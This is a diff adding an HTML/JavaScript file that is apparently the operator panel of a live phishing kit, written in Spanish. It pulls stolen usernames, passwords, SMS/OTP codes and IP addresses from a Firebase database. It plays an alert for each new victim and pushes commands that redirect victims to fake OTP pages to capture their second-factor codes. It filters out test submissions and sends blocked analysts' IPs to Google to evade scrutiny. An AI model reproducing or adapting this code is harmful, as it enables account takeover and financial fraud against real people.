@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>PANEL - Sistema Protegido</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; font-family: 'JetBrains Mono', monospace; color: #fff; overflow-x: hidden; }
+        
+        .header { background: #0a0a0a; border-bottom: 2px solid #6366f1; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .logo { font-family: 'Orbitron', sans-serif; font-size: 24px; font-weight: 900; background: linear-gradient(90deg, #6366f1, #8b5cf6, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; letter-spacing: 2px; }
+        
+        .stats-bar { display: flex; gap: 20px; align-items: center; }
+        .stat-item { background: #111; border: 1px solid #222; padding: 8px 20px; border-radius: 8px; font-size: 13px; }
+        .stat-item span { color: #6366f1; font-weight: bold; }
+        
+        .btn-header { padding: 10px 25px; border: none; border-radius: 8px; font-size: 13px; font-weight: bold; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; }
+        .btn-pink { background: #be185d; color: white; }
+        .btn-dark { background: #1a1a1a; border: 1px solid #333; color: #888; }
+        .btn-dark:hover { border-color: #6366f1; color: #6366f1; }
+        
+        .table-container { padding: 20px 30px; }
+        .table-header { display: grid; grid-template-columns: 80px 140px 140px 140px 100px 140px 100px 1fr; gap: 10px; padding: 15px; background: #0a0a0a; border-bottom: 2px solid #6366f1; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: #666; font-weight: bold; }
+        
+        .data-row { display: grid; grid-template-columns: 80px 140px 140px 140px 100px 140px 100px 1fr; gap: 10px; padding: 15px 10px; background: #0f0f0f; border-left: 4px solid #6366f1; margin-bottom: 8px; align-items: center; transition: all 0.3s; }
+        .data-row:hover { background: #1a1a1a; }
+        .data-row.spam { border-left-color: #ef4444; opacity: 0.6; background: #1a0505; }
+        .data-row.offline { border-left-color: #374151; opacity: 0.5; }
+        .data-row.ip-bloqueada { border-left-color: #dc2626; background: #1a0505; }
+        
+        .cell-status { display: flex; align-items: center; gap: 8px; font-size: 11px; font-weight: bold; }
+        .live-dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
+        .offline-dot { width: 8px; height: 8px; background: #6b7280; border-radius: 50%; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        
+        .cell-pagina { font-size: 10px; color: #f59e0b; text-transform: uppercase; }
+        .cell-pagina.offline { color: #6b7280; }
+        .cell-user { font-family: 'JetBrains Mono', monospace; color: #3b82f6; font-weight: bold; font-size: 13px; overflow: hidden; text-overflow: ellipsis; }
+        .cell-pass { font-family: 'JetBrains Mono', monospace; color: #ef4444; font-weight: bold; font-size: 13px; overflow: hidden; text-overflow: ellipsis; }
+        .cell-token { font-family: 'JetBrains Mono', monospace; color: #10b981; font-weight: bold; font-size: 14px; background: #0a1f15; padding: 5px 10px; border-radius: 5px; text-align: center; border: 1px solid #10b981; }
+        .cell-token.vacio { color: #666; background: #1a1a1a; border: 1px solid #333; }
+        .cell-ip { font-family: 'JetBrains Mono', monospace; color: #888; font-size: 10px; }
+        .cell-ip.bloqueada { color: #dc2626; font-weight: bold; }
+        .cell-tiempo { font-size: 10px; color: #666; }
+        
+        .actions { display: flex; gap: 3px; justify-content: flex-end; flex-wrap: wrap; }
+        .btn-action { padding: 5px 10px; border: none; border-radius: 4px; font-size: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .btn-sms1 { background: #d97706; color: white; }
+        .btn-sms2 { background: #ea580c; color: white; }
+        .btn-reject { background: #374151; color: #9ca3af; }
+        .btn-delete { background: #dc2626; color: white; }
+        .btn-block { background: #7c3aed; color: white; }
+        .btn-block:hover { background: #6d28d9; }
+        
+        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
+        .login-box { background: #0a0a0a; border: 2px solid #6366f1; padding: 50px; border-radius: 10px; width: 100%; max-width: 400px; text-align: center; }
+        .login-box h2 { font-family: 'Orbitron', sans-serif; font-size: 28px; margin-bottom: 30px; color: #6366f1; }
+        .login-box input { width: 100%; background: #111; border: 1px solid #333; padding: 15px; margin-bottom: 15px; color: #fff; font-family: 'JetBrains Mono', monospace; border-radius: 5px; }
+        .login-box button { width: 100%; background: #6366f1; color: white; border: none; padding: 15px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; letter-spacing: 2px; }
+        
+        .notificacion-flotante { position: fixed; top: 100px; right: 30px; padding: 20px 30px; background: #0a0a0a; border-left: 4px solid #10b981; color: white; font-weight: bold; z-index: 200; transform: translateX(500px); transition: transform 0.3s; }
+        .notificacion-flotante.mostrar { transform: translateX(0); }
+        .notificacion-otp { border-left-color: #8b5cf6; }
+        
+        .badge-count { background: #6366f1; color: white; padding: 2px 6px; border-radius: 8px; font-size: 9px; margin-left: 3px; }
+        .badge-bloqueada { background: #dc2626; color: white; padding: 2px 6px; border-radius: 8px; font-size: 9px; margin-left: 3px; }
+    </style>
+</head>
+<body>
+
+    <div id="notificacion" class="notificacion-flotante">
+        <i class="fa-solid fa-bell mr-2"></i>
+        <span id="notificacion-texto">Nuevo cliente</span>
+    </div>
+
+    <div id="login-overlay">
+        <div class="login-box">
+            <h2>🔐 ACCESO PANEL</h2>
+            <input type="text" id="admin-user" placeholder="USUARIO">
+            <input type="password" id="admin-pass" placeholder="CONTRASEÑA">
+            <button onclick="validarAcceso()">ENTRAR</button>
+            <p id="error-msg" style="color: #ef4444; margin-top: 15px; display: none;">Credenciales incorrectas</p>
+        </div>
+    </div>
+
+    <div id="panel-content" style="display: none;">
+        <div class="header">
+            <div class="logo">PANEL PROTEGIDO</div>
+            
+            <div class="stats-bar">
+                <div class="stat-item">TOTAL: <span id="stat-total">0</span></div>
+                <div class="stat-item">LIVE: <span id="stat-online" style="color: #10b981;">0</span></div>
+                <div class="stat-item">OFF: <span id="stat-offline" style="color: #6b7280;">0</span></div>
+                <div class="stat-item">IPs: <span id="stat-ips">0</span></div>
+                <div class="stat-item">BLOQ: <span id="stat-bloqueadas" style="color: #dc2626;">0</span></div>
+            </div>
+            
+            <div style="display: flex; gap: 10px;">
+                <button class="btn-header btn-dark" onclick="cambiarVista('validos')">REGISTROS</button>
+                <button class="btn-header btn-dark" onclick="cambiarVista('spam')">SPAM</button>
+                <button class="btn-header btn-dark" onclick="cambiarVista('ips')">IPs</button>
+                <button class="btn-header btn-dark" onclick="cambiarVista('bloqueadas')">BLOQUEADAS</button>
+                <button class="btn-header btn-pink" onclick="limpiarTests()">LIMPIAR</button>
+                <button class="btn-header btn-dark" onclick="cerrarSesion()">SALIR</button>
+            </div>
+        </div>
+
+        <div class="table-container">
+            <div class="table-header">
+                <div>ESTADO</div>
+                <div>PÁGINA</div>
+                <div>USUARIO</div>
+                <div>CONTRASEÑA</div>
+                <div>TOKEN</div>
+                <div>IP</div>
+                <div>ÚLTIMO</div>
+                <div style="text-align: right;">ACCIONES</div>
+            </div>
+            <div id="container"></div>
+        </div>
+    </div>
+
+    <script>
+        // URL actualizada de Firebase
+        const DB_URL = "https://bindi24-online-default-rtdb.firebaseio.com/";
+        let db;
+        let vistaActual = 'validos';
+        let datos = { validos: [], spam: [], blacklist: {} };
+        let contadorIPs = {};
+        let tokensVistos = {};
+        let idsVistos = {};
+        let audioAutorizado = false;
+
+        const sonido = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
+        sonido.volume = 1.0;
+
+        function playSound() {
+            if (!audioAutorizado) return;
+            try {
+                const a = sonido.cloneNode();
+                a.volume = 1.0;
+                a.play().catch(() => {});
+            } catch(e) {}
+        }
+
+        function mostrarNotificacion(texto, esOTP) {
+            const notif = document.getElementById('notificacion');
+            document.getElementById('notificacion-texto').textContent = texto;
+            notif.className = 'notificacion-flotante mostrar ' + (esOTP ? 'notificacion-otp' : '');
+            setTimeout(() => notif.classList.remove('mostrar'), 3000);
+        }
+
+        function esSpam(id, data) {
+            if (!data || typeof data !== 'object') return true;
+            // Corregido para usar los nombres de campo correctos
+            if (!data.username || !data.password) return true;
+            
+            const spamPatterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass', 'login'];
+            if (spamPatterns.some(s => id.toLowerCase().includes(s))) return true;
+            
+            const spamUsers = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'user1', '123456'];
+            // Corregido para usar el nombre de campo correcto
+            if (spamUsers.includes((data.username || '').toLowerCase())) return true;
+            
+            const spamPasses = ['test', 'prueba', 'admin', 'demo', '123', 'password', '123456'];
+            // Corregido para usar el nombre de campo correcto
+            if (spamPasses.includes((data.password || '').toLowerCase())) return true;
+            
+            // Corregido para usar los nombres de campo correctos y ajustar la longitud mínima
+            if (data.username.length < 3 || data.password.length < 3) return true;
+            if (data.ip && datos.blacklist[data.ip] && datos.blacklist[data.ip].bloqueado) return true;
+            
+            return false;
+        }
+
+        function validarAcceso() {
+            const u = document.getElementById('admin-user').value;
+            const p = document.getElementById('admin-pass').value;
+            if (u === "Ghost" && p === "Cabimas01.") {
+                sessionStorage.setItem('auth_panel', 'true');
+                document.getElementById('login-overlay').style.display = 'none';
+                document.getElementById('panel-content').style.display = 'block';
+                audioAutorizado = true;
+                playSound();
+                iniciarFirebase();
+            } else {
+                document.getElementById('error-msg').style.display = 'block';
+            }
+        }
+
+        if (sessionStorage.getItem('auth_panel') === 'true') {
+            document.getElementById('login-overlay').style.display = 'none';
+            document.getElementById('panel-content').style.display = 'block';
+            audioAutorizado = true;
+            iniciarFirebase();
+        }
+
+        function cerrarSesion() {
+            sessionStorage.removeItem('auth_panel');
+            window.location.reload();
+        }
+
+        function iniciarFirebase() {
+            const firebaseConfig = { databaseURL: DB_URL };
+            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+            db = firebase.database();
+
+            db.ref('logins').on('value', (snap) => {
+                const validos = [];
+                contadorIPs = {};
+                let hayNuevo = false;
+                let hayOTP = false;
+                
+                snap.forEach((child) => {
+                    const data = child.val();
+                    const id = child.key;
+                    
+                    if (esSpam(id, data)) {
+                        db.ref('spam/' + id).set({...data, deletedAt: Date.now()});
+                        db.ref('logins/' + id).remove();
+                        return;
+                    }
+                    
+                    if (data.ip && data.ip !== 'unknown') {
+                        contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
+                    }
+                    
+                    if (!idsVistos[id]) {
+                        if (Object.keys(idsVistos).length > 0) {
+                            hayNuevo = true;
+                        }
+                        idsVistos[id] = true;
+                        tokensVistos[id] = '';
+                    }
+                    
+                    const tokenActual = data.sms || data.otp || '';
+                    if (tokenActual && tokenActual !== '' && tokenActual !== '----' && tokenActual !== tokensVistos[id]) {
+                        if (tokensVistos[id] !== '') {
+                            hayOTP = true;
+                        }
+                        tokensVistos[id] = tokenActual;
+                    }
+                    
+                    validos.push({ id, data, esSpam: false });
+                });
+                
+                if (hayNuevo) {
+                    playSound();
+                    mostrarNotificacion('¡NUEVO CLIENTE!', false);
+                }
+                if (hayOTP) {
+                    setTimeout(() => {
+                        playSound();
+                        mostrarNotificacion('¡TOKEN RECIBIDO!', true);
+                    }, hayNuevo ? 500 : 0);
+                }
+                
+                datos.validos = validos;
+                renderizar();
+            });
+
+            db.ref('spam').on('value', (snap) => {
+                datos.spam = [];
+                snap.forEach((child) => {
+                    datos.spam.push({ id: child.key, data: child.val(), esSpam: true });
+                });
+                renderizar();
+            });
+
+            db.ref('blacklist').on('value', (snap) => {
+                datos.blacklist = snap.val() || {};
+                document.getElementById('stat-bloqueadas').textContent = Object.keys(datos.blacklist).length;
+                renderizar();
+            });
+        }
+
+        function cambiarVista(vista) {
+            vistaActual = vista;
+            renderizar();
+        }
+
+        // ===== FUNCIÓN BLOQUEAR IP =====
+        function bloquearIP(ip) {
+            if (!ip || ip === 'unknown') return alert('IP inválida');
+            
+            const ipKey = ip.replace(/\./g, '_');
+            
+            if (confirm(`¿BLOQUEAR IP ${ip}?\n\nLos visitantes con esta IP serán redirigidos a Google.com`)) {
+                db.ref('blacklist/' + ipKey).set({
+                    ip: ip,
+                    bloqueado: true,
+                    redirigirA: 'https://google.com',
+                    fecha: Date.now()
+                }).then(() => {
+                    alert(`✅ IP ${ip} BLOQUEADA\nRedirigiendo a Google...`);
+                    
+                    // Mover registros existentes de esta IP a spam
+                    datos.validos.forEach(({id, data}) => {
+                        if (data.ip === ip) {
+                            db.ref('spam/' + id).set({...data, ipBloqueada: true});
+                            db.ref('logins/' + id).remove();
+                        }
+                    });
+                });
+            }
+        }
+
+        function desbloquearIP(ip) {
+            if (!ip) return;
+            const ipKey = ip.replace(/\./g, '_');
+            
+            if (confirm(`¿Desbloquear IP ${ip}?`)) {
+                db.ref('blacklist/' + ipKey).remove();
+            }
+        }
+
+        function limpiarTests() {
+            if(!confirm('¿Eliminar registros de prueba?')) return;
+            datos.validos.forEach(({id, data}) => {
+                // Corregido para usar el nombre de campo correcto
+                if(id.toLowerCase().includes('test') || (data.username || '').toLowerCase().includes('test')) {
+                    db.ref('spam/' + id).set({...data});
+                    db.ref('logins/' + id).remove();
+                }
+            });
+        }
+
+        function tiempoTranscurrido(timestamp) {
+            if (!timestamp) return '-';
+            const segundos = Math.floor((Date.now() - timestamp) / 1000);
+            if (segundos < 60) return segundos + 's';
+            if (segundos < 3600) return Math.floor(segundos / 60) + 'm';
+            return Math.floor(segundos / 3600) + 'h';
+        }
+
+        function renderizar() {
+            const container = document.getElementById('container');
+            container.innerHTML = '';
+
+            let onlineCount = 0;
+            let offlineCount = 0;
+
+            datos.validos.forEach(({data}) => {
+                // Corregido para usar el campo correcto para determinar el estado
+                if (data.status === 'PENDING' || data.status === 'ACTIVE' || data.online === true) {
+                    onlineCount++;
+                } else {
+                    offlineCount++;
+                }
+            });
+
+            document.getElementById('stat-total').textContent = datos.validos.length;
+            document.getElementById('stat-online').textContent = onlineCount;
+            document.getElementById('stat-offline').textContent = offlineCount;
+            document.getElementById('stat-ips').textContent = Object.keys(contadorIPs).length;
+
+            if (vistaActual === 'ips') { renderizarIPs(); return; }
+            if (vistaActual === 'bloqueadas') { renderizarBloqueadas(); return; }
+
+            let aMostrar = vistaActual === 'validos' ? datos.validos : 
+                          vistaActual === 'spam' ? datos.spam : 
+                          [...datos.validos, ...datos.spam];
+
+            if (aMostrar.length === 0) {
+                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN REGISTROS</div>';
+                return;
+            }
+
+            aMostrar.forEach(({id, data, esSpam}) => {
+                const token = data.sms || data.otp || '';
+                const tieneOTP = token && token !== '' && token !== '----';
+                const vecesIP = contadorIPs[data.ip] || 1;
+                // Corregido para usar los campos correctos para determinar el estado
+                const estaOnline = data.status === 'PENDING' || data.status === 'ACTIVE' || data.online === true;
+                const ipBloqueada = data.ip && datos.blacklist[data.ip] && datos.blacklist[data.ip].bloqueado;
+                
+                let rowClass = 'data-row';
+                if (esSpam) rowClass += ' spam';
+                if (!estaOnline) rowClass += ' offline';
+                if (ipBloqueada) rowClass += ' ip-bloqueada';
+                
+                container.innerHTML += `
+                    <div class="${rowClass}">
+                        <div class="cell-status">
+                            ${estaOnline ? '<div class="live-dot"></div>LIVE' : '<div class="offline-dot"></div>OFF'}
+                        </div>
+                        <div class="cell-pagina ${!estaOnline ? 'offline' : ''}">${data.pagina || 'BIND'}</div>
+                        // Corregido para usar los nombres de campo correctos
+                        <div class="cell-user">${data.username || 'N/A'}</div>
+                        <div class="cell-pass">${data.password || '****'}</div>
+                        ${tieneOTP ? `<div class="cell-token">${token}</div>` : `<div class="cell-token vacio">----</div>`}
+                        <div class="cell-ip ${ipBloqueada ? 'bloqueada' : ''}">
+                            ${data.ip || 'N/A'}
+                            ${vecesIP > 1 ? `<span class="badge-count">${vecesIP}</span>` : ''}
+                            ${ipBloqueada ? '<span class="badge-bloqueada">BLOQ</span>' : ''}
+                        </div>
+                        // Corregido para usar el campo correcto para el tiempo
+                        <div class="cell-tiempo">${tiempoTranscurrido(data.timestamp || data.ultimoPing)}</div>
+                        <div class="actions">
+                            ${!esSpam ? `
+                                <button class="btn-action btn-sms1" onclick="db.ref('comandos/${id}').set({redirect: 'otp.html'})">SMS 1</button>
+                                <button class="btn-action btn-sms2" onclick="db.ref('comandos/${id}').set({redirect: 'otp2.html'})">SMS 2</button>
+                                <button class="btn-action btn-reject" onclick="db.ref('comandos/${id}').set({redirect: 'index.html'})">RECHAZAR</button>
+                                ${data.ip && data.ip !== 'unknown' ? `<button class="btn-action btn-block" onclick="bloquearIP('${data.ip}')">BLOQUEAR IP</button>` : ''}
+                                <button class="btn-action btn-delete" onclick="db.ref('logins/${id}').remove()">ELIMINAR</button>
+                            ` : `
+                                <button class="btn-action btn-sms1" onclick="recuperar('${id}')">RECUPERAR</button>
+                                <button class="btn-action btn-delete" onclick="db.ref('spam/${id}').remove()">ELIMINAR</button>
+                            `}
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function renderizarIPs() {
+            const container = document.getElementById('container');
+            const ipsOrdenadas = Object.entries(contadorIPs).sort((a, b) => b[1] - a[1]);
+            
+            if (ipsOrdenadas.length === 0) {
+                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN IPs</div>';
+                return;
+            }
+
+            let html = '<div style="background: #0a0a0a; padding: 20px; border-radius: 10px;"><table style="width: 100%; border-collapse: collapse;">';
+            html += '<tr style="color: #666; font-size: 12px; border-bottom: 1px solid #333;"><th>IP</th><th>INTENTOS</th><th>ESTADO</th><th>ACCIONES</th></tr>';
+            
+            ipsOrdenadas.forEach(([ip, count]) => {
+                const bloqueada = datos.blacklist[ip] && datos.blacklist[ip].bloqueado;
+                html += `<tr style="border-bottom: 1px solid #1a1a1a;">
+                    <td style="padding: 15px; color: ${bloqueada ? '#dc2626' : '#f59e0b'};">${ip}</td>
+                    <td style="padding: 15px;"><span style="background: ${count >= 10 ? '#dc2626' : count >= 5 ? '#f59e0b' : '#10b981'}; color: white; padding: 2px 10px; border-radius: 10px; font-size: 11px;">${count}</span></td>
+                    <td style="padding: 15px; color: ${bloqueada ? '#dc2626' : '#10b981'};">${bloqueada ? 'BLOQUEADA → GOOGLE' : 'ACTIVA'}</td>
+                    <td style="padding: 15px;">
+                        ${bloqueada 
+                            ? `<button onclick="desbloquearIP('${ip}')" class="btn-action btn-sms1" style="padding: 5px 15px; font-size: 10px;">DESBLOQUEAR</button>`
+                            : `<button onclick="bloquearIP('${ip}')" class="btn-action btn-block" style="padding: 5px 15px; font-size: 10px;">BLOQUEAR</button>`
+                        }
+                    </td>
+                </tr>`;
+            });
+            
+            html += '</table></div>';
+            container.innerHTML = html;
+        }
+
+        function renderizarBloqueadas() {
+            const container = document.getElementById('container');
+            const ipsBloqueadas = Object.entries(datos.blacklist).filter(([key, val]) => val.bloqueado);
+            
+            if (ipsBloqueadas.length === 0) {
+                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN IPs BLOQUEADAS</div>';
+                return;
+            }
+
+            let html = '<div style="background: #1a0505; border: 1px solid #dc2626; padding: 20px; border-radius: 10px;">';
+            html += '<h3 style="color: #dc2626; margin-bottom: 20px; font-family: Orbitron;">🚫 IPs BLOQUEADAS (Redirigen a Google)</h3>';
+            html += '<table style="width: 100%; border-collapse: collapse;">';
+            html += '<tr style="color: #ef4444; font-size: 12px; border-bottom: 1px solid #7f1d1d;"><th>IP</th><th>BLOQUEADA DESDE</th><th>REDIRECCIÓN</th><th>ACCIONES</th></tr>';
+            
+            ipsBloqueadas.forEach(([key, data]) => {
+                const fecha = data.fecha ? new Date(data.fecha).toLocaleString() : 'Desconocida';
+                html += `<tr style="border-bottom: 1px solid #1a1a1a;">
+                    <td style="padding: 15px; color: #dc2626; font-family: monospace; font-weight: bold;">${data.ip}</td>
+                    <td style="padding: 15px; color: #fca5a5; font-size: 12px;">${fecha}</td>
+                    <td style="padding: 15px; color: #f59e0b; font-size: 12px;">${data.redirigirA || 'https://google.com'}</td>
+                    <td style="padding: 15px;">
+                        <button onclick="desbloquearIP('${data.ip}')" class="btn-action btn-sms1" style="padding: 5px 15px; font-size: 10px;">DESBLOQUEAR</button>
+                    </td>
+                </tr>`;
+            });
+            
+            html += '</table></div>';
+            container.innerHTML = html;
+        }
+
+        function recuperar(id) {
+            db.ref('spam/' + id).once('value').then(snap => {
+                const d = snap.val();
+                if(d) { db.ref('logins/' + id).set(d); db.ref('spam/' + id).remove(); }
+            });
+        }
+    </script>
+</body>
+</html>
